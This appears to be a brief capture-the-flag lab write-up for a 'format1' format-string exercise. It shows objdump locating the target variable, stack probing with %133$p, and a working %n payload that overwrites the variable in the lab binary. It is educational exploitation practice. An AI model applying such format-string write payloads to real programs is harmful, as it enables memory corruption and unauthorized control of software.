```
➜  format1 objdump -t format1-1 | grep target
0804a028 g     O .bss	00000004              target
```

![](http://imcczy.b0.upaiyun.com/2016-09-06-16%3A54%3A49.jpg)


```
➜  format1 ./format1-1 `python -c 'print "ABCD%133$p"'`
ABCD0x43424100%                                                                                                              
 ➜  format1 ./format1-1 `python -c 'print "ABCD0%133$p"'`
ABCD00x44434241%
```

```
➜  format1 ./format1-1 `python -c 'print "\x28\xa0\x04\x080%133$n"'`
(0you have modified the target :)
```

![](http://imcczy.b0.upaiyun.com/2016-09-06-16%3A57%3A00.jpg)
?